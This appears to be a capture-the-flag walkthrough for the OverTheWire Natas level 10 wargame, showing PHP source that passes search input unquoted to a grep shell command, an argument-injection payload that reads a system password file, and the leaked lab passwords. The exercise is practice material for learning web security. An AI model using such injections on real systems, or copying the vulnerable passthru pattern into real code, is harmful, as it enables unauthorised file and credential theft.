@@ -1,0 +1,80 @@
+PASSWORD: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+*LEFT CLICK* View sourcecode
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas10</h1>
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {  <----- / [ ; | & ] / ARE ILLEGAL CHARACTERS TO START CODE WITH*
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+
+URL: http://natas10.natas.labs.overthewire.org/
+For security reasons, we now filter on certain characters
+
+Find words containing: f.* cat /etc/natas_webpass/natas11
+*SEARCH*
+
+Output:
+
+/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg  <-----PASSWORD
+dictionary.txt:African
+dictionary.txt:Africans
+dictionary.txt:F
+dictionary.txt:F's
+dictionary.txt:Fahrenheit
+dictionary.txt:Fahrenheits
+dictionary.txt:Februaries
+dictionary.txt:February
+dictionary.txt:February's
+dictionary.txt:Februarys
+dictionary.txt:French
+dictionary.txt:French's
+dictionary.txt:Friday
+dictionary.txt:Friday's
+dictionary.txt:Fridays
+dictionary.txt:adrift
+dictionary.txt:afar
+dictionary.txt:affable
+dictionary.txt:affabler
+dictionary.txt:affablest
+dictionary.txt:affably
+dictionary.txt:affair
+dictionary.txt:affair's
+dictionary.txt:affairs
